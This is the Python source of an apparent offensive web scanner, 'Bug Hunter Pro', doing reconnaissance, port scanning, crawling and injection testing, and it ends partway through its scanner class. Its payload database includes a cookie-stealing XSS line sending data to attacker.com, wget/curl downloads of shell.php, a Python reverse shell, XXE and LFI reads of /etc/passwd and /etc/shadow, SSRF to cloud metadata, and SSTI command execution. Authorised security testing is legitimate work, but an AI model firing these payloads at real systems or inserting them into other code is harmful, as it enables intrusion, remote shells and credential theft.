#!/usr/bin/env python3
"""
BUG HUNTER PRO - Ultimate Web Application Security Assessment Platform
Version: 2.0 Enterprise Edition
Author: Security Research Team
"""

import asyncio
import aiohttp
import json
import os
import sys
import re
import socket
import ssl
import hashlib
import base64
import time
import random
import string
from urllib.parse import urlparse, urljoin, quote, unquote
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import argparse
import threading
import queue
import csv
import yaml
import xml.etree.ElementTree as ET
from pathlib import Path
import dns.resolver
import subprocess
import ipaddress
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import hmac
import uuid
import html

# ============================================================================
# CORE ENGINE & CONFIGURATION
# ============================================================================

class ScanMode(Enum):
    FAST = "fast"
    NORMAL = "normal"
    DEEP = "deep"
    AGGRESSIVE = "aggressive"

class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class ScanConfig:
    """Configuration for security scan"""
    target: str
    mode: ScanMode = ScanMode.NORMAL
    max_concurrent: int = 100
    timeout: int = 30
    depth: int = 5
    follow_redirects: bool = True
    verify_ssl: bool = False
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    output_formats: List[str] = field(default_factory=lambda: ["html", "json"])
    custom_wordlists: List[str] = field(default_factory=list)
    auth_token: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    excluded_paths: List[str] = field(default_factory=list)
    rate_limit: int = 10  # requests per second
    save_responses: bool = True
    proxy: Optional[str] = None

class BugHunterPro:
    """
    Main Bug Hunter Pro Engine
    """
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.payloads = self.load_payloads()
        self.wordlists = self.load_wordlists()
        self.session = None
        self.results = []
        self.stats = {
            "start_time": None,
            "end_time": None,
            "requests_sent": 0,
            "vulnerabilities_found": 0,
            "subdomains_discovered": 0,
            "endpoints_found": 0,
            "files_discovered": 0
        }
        
        # Initialize modules
        self.modules = {
            "recon": ReconnaissanceModule(self),
            "crawler": SmartCrawler(self),
            "scanner": VulnerabilityScanner(self),
            "api_tester": APISecurityTester(self),
            "auth_tester": AuthenticationTester(self),
            "mobile_tester": MobileAPITester(self),
            "report": ReportGenerator(self)
        }
        
        print(f"""
╔══════════════════════════════════════════════════════════╗
║               BUG HUNTER PRO v2.0                        ║
║          Ultimate Security Assessment Platform           ║
╚══════════════════════════════════════════════════════════╝
        """)
    
    def load_payloads(self):
        """Load payloads from config or use defaults"""
        # For now, return empty list - payloads are in PayloadDatabase class
        return []
    
    async def init_session(self):
        """Initialize HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent,
            ssl=self.config.verify_ssl
        )
        
        headers = {
            "User-Agent": self.config.user_agent
        }
        headers.update(self.config.headers)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers
        )
        
        if self.config.proxy:
            self.session.proxy = self.config.proxy

    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()

    def load_wordlists(self) -> Dict[str, List[str]]:
        """Load all wordlists"""
        wordlists = {
            "subdomains": [],
            "directories": [],
            "files": [],
            "parameters": [],
            "fuzz": [],
            "passwords": [],
            "usernames": []
        }
        
        # Default wordlists
        default_wordlists = {
            "subdomains": ["api", "admin", "test", "dev", "staging", "mail", "ftp"],
            "directories": [
                "admin", "administrator", "wp-admin", "cpanel", "phpmyadmin",
                "backup", "backups", "config", "configuration", "logs",
                "api", "v1", "v2", "graphql", "rest", "soap", "swagger",
                "debug", "test", "dev", "staging", "old", "new", "temp"
            ]
        }
        
        # Load custom wordlists
        for wordlist_path in self.config.custom_wordlists:
            try:
                with open(wordlist_path, 'r') as f:
                    lines = [line.strip() for line in f if line.strip()]
                    # Auto-detect wordlist type from filename
                    if "subdomain" in wordlist_path.lower():
                        wordlists["subdomains"].extend(lines)
                    elif "directory" in wordlist_path.lower():
                        wordlists["directories"].extend(lines)
                    elif "file" in wordlist_path.lower():
                        wordlists["files"].extend(lines)
                    else:
                        wordlists["fuzz"].extend(lines)
            except:
                pass
        
        # Add defaults
        for key, values in default_wordlists.items():
            wordlists[key].extend(values)
        
        return wordlists
    
    async def run_full_assessment(self):
        """Run complete security assessment"""
        self.stats["start_time"] = datetime.now()
        
        try:
            await self.init_session()
            
            print(f"[+] Target: {self.config.target}")
            print(f"[+] Mode: {self.config.mode.value}")
            print(f"[+] Starting comprehensive security assessment...\n")
            
            # ==================== PHASE 1: RECONNAISSANCE ====================
            print("[1/6] 🔍 RECONNAISSANCE PHASE")
            print("-" * 50)
            
            assets = await self.modules["recon"].run()
            
            # ==================== PHASE 2: CRAWLING ====================
            print("\n[2/6] 🕷️  CRAWLING & MAPPING")
            print("-" * 50)
            
            endpoints = await self.modules["crawler"].crawl(assets)
            
            # ==================== PHASE 3: VULNERABILITY SCANNING ====================
            print("\n[3/6] ⚡ VULNERABILITY SCANNING")
            print("-" * 50)
            
            vuln_findings = await self.modules["scanner"].scan(endpoints)
            self.results.extend(vuln_findings)
            
            # ==================== PHASE 4: API SECURITY TESTING ====================
            print("\n[4/6] 🔗 API SECURITY TESTING")
            print("-" * 50)
            
            api_findings = await self.modules["api_tester"].test(endpoints)
            self.results.extend(api_findings)
            
            # ==================== PHASE 5: AUTHENTICATION TESTING ====================
            print("\n[5/6] 🔐 AUTHENTICATION TESTING")
            print("-" * 50)
            
            auth_findings = await self.modules["auth_tester"].test()
            self.results.extend(auth_findings)
            
            # ==================== PHASE 6: REPORT GENERATION ====================
            print("\n[6/6] 📊 GENERATING REPORTS")
            print("-" * 50)
            
            self.stats["end_time"] = datetime.now()
            self.stats["vulnerabilities_found"] = len(self.results)
            
            await self.modules["report"].generate(self.results)
            
            self.print_summary()
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
            self.stats["end_time"] = datetime.now()
        except Exception as e:
            print(f"\n[!] Scan failed: {str(e)}")
            self.stats["end_time"] = datetime.now()
            import traceback
            traceback.print_exc()
        finally:
            await self.close_session()
    
    def print_summary(self):
        """Print scan summary"""
        if not self.stats["start_time"] or not self.stats["end_time"]:
            print("Scan was not completed properly.")
            return
            
        duration = self.stats["end_time"] - self.stats["start_time"]
        
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        print(f"Duration: {duration}")
        print(f"Target: {self.config.target}")
        print(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
        print(f"Subdomains Discovered: {self.stats['subdomains_discovered']}")
        print(f"Endpoints Found: {self.stats['endpoints_found']}")
        
        # Count by severity
        severity_counts = {}
        for finding in self.results:
            sev = finding.get("severity", "info")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        print("\nSeverity Breakdown:")
        for severity in Severity:
            count = severity_counts.get(severity.value, 0)
            print(f"  {severity.value.upper()}: {count}")
        
        print("\nTop 5 Critical Findings:")
        critical_findings = [f for f in self.results if f.get("severity") == "critical"]
        for i, finding in enumerate(critical_findings[:5]):
            print(f"  {i+1}. {finding.get('title')}")
        
        print("\nReports generated in 'bug_hunter_reports/' directory")

# ============================================================================
# RECONNAISSANCE MODULE
# ============================================================================

class ReconnaissanceModule:
    """Comprehensive reconnaissance module"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
        self.config = engine.config
        
    async def run(self) -> Dict[str, Any]:
        """Run all reconnaissance tasks"""
        assets = {
            "subdomains": [],
            "ips": [],
            "ports": {},
            "technologies": [],
            "directories": [],
            "files": [],
            "cloud_info": {},
            "dns_records": {}
        }
        
        # 1. Subdomain enumeration
        print("  [+] Subdomain enumeration...")
        subdomains = await self.enumerate_subdomains()
        assets["subdomains"] = subdomains
        self.engine.stats["subdomains_discovered"] = len(subdomains)
        
        # 2. Port scanning
        print("  [+] Port scanning...")
        for subdomain in subdomains[:10]:  # Limit for speed
            open_ports = await self.scan_ports(subdomain)
            if open_ports:
                assets["ports"][subdomain] = open_ports
        
        # 3. Technology detection
        print("  [+] Technology fingerprinting...")
        for subdomain in subdomains[:5]:
            tech = await self.detect_technology(subdomain)
            if tech:
                assets["technologies"].append({"domain": subdomain, "tech": tech})
        
        # 4. Directory brute-forcing
        print("  [+] Directory brute-forcing...")
        directories = await self.brute_force_directories(self.config.target)
        assets["directories"] = directories
        
        # 5. Cloud infrastructure detection
        print("  [+] Cloud infrastructure detection...")
        cloud_info = await self.detect_cloud_infrastructure(self.config.target)
        assets["cloud_info"] = cloud_info
        
        # 6. DNS enumeration
        print("  [+] DNS enumeration...")
        dns_records = await self.enumerate_dns(self.config.target)
        assets["dns_records"] = dns_records
        
        # 7. JavaScript analysis
        print("  [+] JavaScript analysis...")
        js_endpoints = await self.analyze_javascript(self.config.target)
        assets["js_endpoints"] = js_endpoints
        
        return assets
    
    async def enumerate_subdomains(self) -> List[str]:
        """Enumerate subdomains from 50+ sources"""
        subdomains = set()
        
        # Methods for subdomain enumeration
        methods = [
            self._crt_sh_search,
            self._dns_bruteforce,
            self._dns_zone_transfer
        ]
        
        # Run all methods concurrently
        tasks = [method() for method in methods]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                subdomains.update(result)
        
        return list(subdomains)
    
    async def _crt_sh_search(self) -> List[str]:
        """Search crt.sh for certificates"""
        try:
            domain = self.config.target.replace("https://", "").replace("http://", "").split("/")[0]
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            
            async with self.engine.session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return [item["name_value"] for item in data]
        except:
            pass
        return []
    
    async def _dns_bruteforce(self) -> List[str]:
        """Brute force subdomains using wordlist"""
        subdomains = []
        domain = self.config.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        for word in self.engine.wordlists["subdomains"][:500]:  # Limit for speed
            subdomain = f"{word}.{domain}"
            try:
                await dns.resolver.resolve(subdomain, 'A')
                subdomains.append(subdomain)
            except:
                pass
        
        return subdomains
    
    async def _dns_zone_transfer(self) -> List[str]:
        """Attempt DNS zone transfer"""
        try:
            domain = self.config.target.replace("https://", "").replace("http://", "").split("/")[0]
            ns_servers = await dns.resolver.resolve(domain, 'NS')
            
            for ns in ns_servers:
                try:
                    zone = dns.resolver.resolve(domain, 'AXFR')
                    return [str(r) for r in zone]
                except:
                    continue
        except:
            pass
        return []
    
    async def scan_ports(self, hostname: str) -> List[int]:
        """Scan common ports on hostname"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080, 8443]
        
        async def check_port(port):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(hostname, port),
                    timeout=2
                )
                writer.close()
                await writer.wait_closed()
                return port
            except:
                return None
        
        tasks = [check_port(port) for port in common_ports]
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                open_ports.append(result)
        
        return open_ports
    
    async def detect_technology(self, domain: str) -> Dict[str, Any]:
        """Detect web technologies"""
        tech = {
            "server": None,
            "cms": None,
            "framework": None,
            "language": None,
            "javascript": [],
            "database": None,
            "cdn": None
        }
        
        try:
            url = f"https://{domain}" if not domain.startswith("http") else domain
            async with self.engine.session.get(url) as response:
                headers = response.headers
                body = await response.text()
                
                # Server detection
                if "server" in headers:
                    tech["server"] = headers["server"]
                
                # CMS detection
                if "wp-content" in body or "wordpress" in body.lower():
                    tech["cms"] = "WordPress"
                elif "drupal" in body.lower():
                    tech["cms"] = "Drupal"
                elif "joomla" in body.lower():
                    tech["cms"] = "Joomla"
                
                # Framework detection
                if "laravel" in body.lower() or "csrf-token" in body:
                    tech["framework"] = "Laravel"
                elif "django" in body.lower():
                    tech["framework"] = "Django"
                elif "react" in body or "next" in body:
                    tech["javascript"] = ["React"]
                
                # CDN detection
                if "cloudflare" in headers.get("server", "").lower():
                    tech["cdn"] = "Cloudflare"
                elif "akamai" in headers.get("server", "").lower():
                    tech["cdn"] = "Akamai"
        
        except:
            pass
        
        return tech
    
    async def brute_force_directories(self, base_url: str) -> List[str]:
        """Brute force directories"""
        found_dirs = []
        
        for directory in self.engine.wordlists["directories"][:200]:  # Limit for speed
            url = f"{base_url.rstrip('/')}/{directory}"
            try:
                async with self.engine.session.head(url, allow_redirects=True) as response:
                    if response.status in [200, 301, 302, 403]:
                        found_dirs.append(url)
            except:
                pass
        
        return found_dirs
    
    async def detect_cloud_infrastructure(self, domain: str) -> Dict[str, Any]:
        """Detect cloud infrastructure"""
        cloud_info = {
            "aws": False,
            "azure": False,
            "gcp": False,
            "digitalocean": False,
            "heroku": False,
            "services": []
        }
        
        try:
            # Check DNS records for cloud indicators
            answers = await dns.resolver.resolve(domain, 'CNAME')
            for answer in answers:
                cname = str(answer.target).lower()
                
                if "amazonaws.com" in cname or "aws" in cname:
                    cloud_info["aws"] = True
                    cloud_info["services"].append("AWS")
                elif "azure" in cname:
                    cloud_info["azure"] = True
                    cloud_info["services"].append("Azure")
                elif "google" in cname or "gcp" in cname:
                    cloud_info["gcp"] = True
                    cloud_info["services"].append("GCP")
                elif "heroku" in cname:
                    cloud_info["heroku"] = True
                    cloud_info["services"].append("Heroku")
        
        except:
            pass
        
        return cloud_info
    
    async def enumerate_dns(self, domain: str) -> Dict[str, List[str]]:
        """Enumerate DNS records"""
        dns_info = {
            "a": [],
            "aaaa": [],
            "cname": [],
            "mx": [],
            "txt": [],
            "ns": [],
            "srv": []
        }
        
        try:
            # A records
            try:
                answers = await dns.resolver.resolve(domain, 'A')
                dns_info["a"] = [str(r) for r in answers]
            except:
                pass
            
            # CNAME
            try:
                answers = await dns.resolver.resolve(domain, 'CNAME')
                dns_info["cname"] = [str(r.target) for r in answers]
            except:
                pass
            
            # MX
            try:
                answers = await dns.resolver.resolve(domain, 'MX')
                dns_info["mx"] = [str(r.exchange) for r in answers]
            except:
                pass
            
            # TXT
            try:
                answers = await dns.resolver.resolve(domain, 'TXT')
                dns_info["txt"] = [str(r) for r in answers]
            except:
                pass
            
            # NS
            try:
                answers = await dns.resolver.resolve(domain, 'NS')
                dns_info["ns"] = [str(r.target) for r in answers]
            except:
                pass
        
        except Exception as e:
            pass
        
        return dns_info
    
    async def analyze_javascript(self, url: str) -> List[str]:
        """Analyze JavaScript files for endpoints"""
        endpoints = []
        
        try:
            async with self.engine.session.get(url) as response:
                body = await response.text()
                
                # Extract JavaScript file URLs
                js_patterns = [
                    r'src=["\']([^"\']+\.js)["\']',
                    r'<script[^>]*src=["\']([^"\']+)["\']'
                ]
                
                for pattern in js_patterns:
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for match in matches:
                        js_url = urljoin(url, match)
                        endpoints.append(js_url)
                        
                        # Fetch and analyze JS content
                        try:
                            async with self.engine.session.get(js_url) as js_response:
                                js_content = await js_response.text()
                                
                                # Extract API endpoints from JS
                                api_patterns = [
                                    r'["\'](/api/[^"\']+)["\']',
                                    r'["\'](/v[0-9]/[^"\']+)["\']',
                                    r'["\'](https?://[^"\']+\.json)["\']',
                                    r'fetch\(["\']([^"\']+)["\']',
                                    r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                                    r'\.ajax\([^)]*url:\s*["\']([^"\']+)["\']'
                                ]
                                
                                for api_pattern in api_patterns:
                                    api_matches = re.findall(api_pattern, js_content)
                                    endpoints.extend([urljoin(js_url, m) for m in api_matches])
                        
                        except:
                            pass
        
        except:
            pass
        
        return endpoints

# ============================================================================
# SMART CRAWLER
# ============================================================================

class SmartCrawler:
    """Intelligent web crawler for endpoint discovery"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
        self.visited = set()
        self.endpoints = []
        
    async def crawl(self, assets: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Crawl discovered assets"""
        print("  [+] Starting smart crawling...")
        
        # Start with main target
        await self._crawl_url(self.engine.config.target, depth=0)
        
        # Crawl discovered subdomains
        for subdomain in assets.get("subdomains", [])[:5]:  # Limit for speed
            await self._crawl_url(f"https://{subdomain}", depth=0)
        
        # Crawl discovered directories
        for directory in assets.get("directories", [])[:10]:
            await self._crawl_url(directory, depth=1)
        
        self.engine.stats["endpoints_found"] = len(self.endpoints)
        return self.endpoints
    
    async def _crawl_url(self, url: str, depth: int):
        """Crawl a single URL"""
        if depth > self.engine.config.depth or url in self.visited:
            return
        
        self.visited.add(url)
        
        try:
            async with self.engine.session.get(url, allow_redirects=True) as response:
                if response.status in [200, 301, 302, 403, 401]:
                    # Extract links from page
                    html_content = await response.text()
                    
                    # Save endpoint information
                    endpoint = {
                        "url": str(response.url),
                        "method": "GET",
                        "status": response.status,
                        "headers": dict(response.headers),
                        "parameters": self._extract_parameters(str(response.url)),
                        "forms": self._extract_forms(html_content),
                        "links": self._extract_links(html_content, str(response.url))
                    }
                    
                    self.endpoints.append(endpoint)
                    
                    # Recursively crawl links if not too deep
                    if depth < self.engine.config.depth:
                        for link in endpoint["links"][:20]:  # Limit for performance
                            if link not in self.visited:
                                await self._crawl_url(link, depth + 1)
        
        except Exception as e:
            pass
    
    def _extract_parameters(self, url: str) -> List[Dict[str, str]]:
        """Extract parameters from URL"""
        params = []
        try:
            parsed = urlparse(url)
            query = parsed.query
            if query:
                for param in query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params.append({
                            "name": unquote(key),
                            "value": unquote(value),
                            "location": "query"
                        })
        except:
            pass
        return params
    
    def _extract_forms(self, html: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML"""
        forms = []
        
        # Simple regex-based form extraction
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for match in form_matches:
            form_html = match.group(0)
            form_data = {
                "action": self._extract_form_action(form_html),
                "method": self._extract_form_method(form_html),
                "inputs": self._extract_form_inputs(form_html)
            }
            forms.append(form_data)
        
        return forms
    
    def _extract_form_action(self, form_html: str) -> str:
        """Extract form action"""
        match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        return match.group(1) if match else ""
    
    def _extract_form_method(self, form_html: str) -> str:
        """Extract form method"""
        match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        return match.group(1).upper() if match else "GET"
    
    def _extract_form_inputs(self, form_html: str) -> List[Dict[str, str]]:
        """Extract form inputs"""
        inputs = []
        
        # Find all input tags
        input_pattern = r'<(input|textarea|select)[^>]*>'
        input_matches = re.finditer(input_pattern, form_html, re.IGNORECASE)
        
        for match in input_matches:
            tag = match.group(0)
            
            # Extract name
            name_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            name = name_match.group(1) if name_match else ""
            
            # Extract type
            type_match = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            input_type = type_match.group(1) if type_match else "text"
            
            # Extract value
            value_match = re.search(r'value=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            value = value_match.group(1) if value_match else ""
            
            if name:  # Only add if input has a name
                inputs.append({
                    "name": name,
                    "type": input_type,
                    "value": value,
                    "tag": match.group(1)
                })
        
        return inputs
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """Extract links from HTML"""
        links = set()
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        href_matches = re.findall(href_pattern, html, re.IGNORECASE)
        
        for href in href_matches:
            # Skip JavaScript and mailto links
            if href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                continue
            
            # Convert relative URLs to absolute
            absolute_url = urljoin(base_url, href)
            
            # Filter out external links if configured
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        # Extract src attributes
        src_pattern = r'src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, html, re.IGNORECASE)
        
        for src in src_matches:
            absolute_url = urljoin(base_url, src)
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        return list(links)
    
    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """Check if two URLs are in the same domain"""
        try:
            domain1 = urlparse(url1).netloc
            domain2 = urlparse(url2).netloc
            
            # Allow subdomains
            return domain1.endswith(domain2) or domain2.endswith(domain1)
        except:
            return False

# ============================================================================
# PAYLOAD DATABASE
# ============================================================================

class PayloadDatabase:
    """Database of attack payloads for various vulnerabilities"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load all payloads"""
        payloads = {
            # SQL Injection
            "sql": [
                "'", "''", "`", "\"", "' OR '1'='1", "' OR '1'='1' --", 
                "' OR '1'='1' #", "' OR '1'='1' /*", "admin' --", "admin' #",
                "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--",
                "1' ORDER BY 1--", "1' ORDER BY 1000--", 
                "' AND 1=1--", "' AND 1=2--",
                "' OR SLEEP(5)--", "' OR BENCHMARK(1000000,MD5('A'))--",
                "' OR 1=1--", "' OR 1=0--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>1)--"
            ],
            
            # XSS Payloads
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\" onmouseover=\"alert(1)",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
                "<details open ontoggle=alert(1)>",
                "<select onfocus=alert(1)></select>",
                "<video><source onerror=\"alert(1)\">",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<div style=\"width:1000px;height:1000px\" onmouseover=\"alert(1)\"></div>",
                "';alert(1)//",
                "\";alert(1)//",
                "</script><script>alert(1)</script>",
                "<script>alert(document.domain)</script>",
                "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
            ],
            
            # XXE Payloads
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]><root></root>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
            ],
            
            # SSRF Payloads
            "ssrf": [
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "http://[::1]",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://admin:admin@localhost",
                "file:///etc/passwd",
                "gopher://localhost:25/xHELO%20localhost",
                "dict://localhost:11211/stat"
            ],
            
            # LFI/RFI Payloads
            "lfi": [
                "../../../../etc/passwd",
                "../../../../etc/hosts",
                "../../../../etc/issue",
                "../../../../etc/shadow",
                "../../../../windows/win.ini",
                "../../../../boot.ini",
                "....//....//....//etc/passwd",
                "../" * 20 + "etc/passwd",
                "/etc/passwd%00",
                "/etc/passwd\x00",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
                "expect://id",
                "zip://path/to/archive.zip#file.txt",
                "phar://path/to/archive.phar/file.txt"
            ],
            
            # Command Injection
            "rce": [
                ";id",
                "|id",
                "&id",
                "&&id",
                "||id",
                "`id`",
                "$(id)",
                "id;",
                "id|",
                "id&",
                "id&&",
                "id||",
                "id`",
                "id$(",
                "sleep 5",
                "ping -c 5 127.0.0.1",
                "whoami",
                "uname -a",
                "ls -la",
                "cat /etc/passwd",
                "ifconfig",
                "netstat -an",
                "ps aux",
                "wget http://attacker.com/shell.php",
                "curl http://attacker.com/shell.php -o shell.php",
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ],
            
            # SSTI Payloads
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "#{7*7}",
                "{{config}}",
                "{{settings.SECRET_KEY}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= system('id') %>",
                "#{''.class.forName('java.lang.Runtime').getRuntime().exec('id')}"
            ],
            
            # Open Redirect
            "redirect": [
                "http://evil.com",
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "evil.com",
                "http://google.com",
                "https://facebook.com",
                "http://attacker.com",
                "https://attacker.com"
            ],
            
            # CRLF Injection
            "crlf": [
                "%0d%0aSet-Cookie:malicious=payload",
                "%0d%0aX-Injected: header",
                "%0aX-Injected: header",
                "%0dX-Injected: header",
                "\r\nSet-Cookie: malicious=payload",
                "\nX-Injected: header",
                "\rX-Injected: header"
            ],
            
            # Host Header Injection
            "host": [
                "evil.com",
                "evil.com:80",
                "attacker.com",
                "localhost",
                "127.0.0.1",
                "localhost:80",
                "127.0.0.1:80"
            ]
        }
        
        return payloads
    
    def get_payloads(self, vuln_type: str) -> List[str]:
        """Get payloads for a specific vulnerability type"""
        return self.payloads.get(vuln_type, [])

# ============================================================================
# VULNERABILITY SCANNER
# ============================================================================

class VulnerabilityScanner:
    """Main vulnerability scanning engine"""
    
    def __init__(self, engine: BugHunterPro):
        self.engine = engine
        self.results = []
        
        # Initialize payloads from PayloadDatabase
        self.payloads = PayloadDatabase()
        
    async def scan(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan endpoints for vulnerabilities"""
        findings = []
        
        print("  [+] Testing for SQL Injection...")
        sql_findings = await self.test_sql_injection(endpoints)
        findings.extend(sql_findings)
        
        print("  [+] Testing for XSS...")
        xss_findings = await self.test_xss(endpoints)
        findings.extend(xss_findings)
        
        print("  [+] Testing for SSRF...")
        ssrf_findings = await self.test_ssrf(endpoints)
        findings.extend(ssrf_findings)
        
        print("  [+] Testing for LFI/RFI...")
        lfi_findings = await self.test_lfi(endpoints)
        findings.extend(lfi_findings)
        
        print("  [+] Testing for RCE...")
        rce_findings = await self.test_rce(endpoints)
        findings.extend(rce_findings)
        
        print("  [+] Testing for XXE...")
        xxe_findings = await self.test_xxe(endpoints)
        findings.extend(xxe_findings)
        
        print("  [+] Testing for SSTI...")
        ssti_findings = await self.test_ssti(endpoints)
        findings.extend(ssti_findings)
        
        print("  [+] Testing for IDOR...")
        idor_findings = await self.test_idor(endpoints)
        findings.extend(idor_findings)
        
        print("  [+] Testing for Open Redirect...")
        redirect_findings = await self.test_open_redirect(endpoints)
        findings.extend(redirect_findings)
        
        print("  [+] Testing for CRLF Injection...")
        crlf_findings = await self.test_crlf_injection(endpoints)
        findings.extend(crlf_findings)
        
        print("  [+] Testing for Host Header Injection...")
        host_findings = await self.test_host_header_injection(endpoints)
        findings.extend(host_findings)
        
        return findings
    
    async def test_sql_injection(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for SQL Injection vulnerabilities"""
        findings = []
        
        for endpoint in endpoints[:50]:  # Limit for performance
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                original_value = param["value"]
                
                for payload in self.payloads.get_payloads("sql")[:10]:  # Test first 10 payloads
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        async with self.engine.session.get(test_url, allow_redirects=True) as response:
                            response_text = await response.text()
                            
                            # Check for SQL error patterns
                            sql_errors = [
                                "SQL syntax", "MySQL", "PostgreSQL", "SQLite",
                                "ORA-", "Microsoft.*Driver", "ODBC",
                                "syntax error", "unclosed quotation",
                                "Warning: mysql", "Warning: pg",
                                "You have an error in your SQL syntax",
                                "Unclosed quotation mark",
                                "division by zero"
                            ]
                            
                            for error in sql_errors:
                                if error.lower() in response_text.lower():
                                    findings.append({
                                        "title": "SQL Injection Vulnerability",
                                        "description": f"SQL injection detected in parameter '{param_name}'",
                                        "severity": "critical",
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "evidence": error,
                                        "confidence": "high"
                                    })
                                    break
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_xss(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for XSS vulnerabilities"""
        findings = []
        
        for endpoint in endpoints[:50]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            for param in params:
                param_name = param["name"]
                
                for payload in self.payloads.get_payloads("xss")[:5]:  # Test first 5 payloads
                    try:
                        test_url = self._inject_payload(url, param_name, payload)
                        
                        async with self.engine.session.get(test_url, allow_redirects=True) as response:
                            response_text = await response.text()
                            
                            # Check if payload is reflected
                            if payload in response_text:
                                findings.append({
                                    "title": "Cross-Site Scripting (XSS)",
                                    "description": f"XSS payload reflected in parameter '{param_name}'",
                                    "severity": "high",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": "Payload reflected in response",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
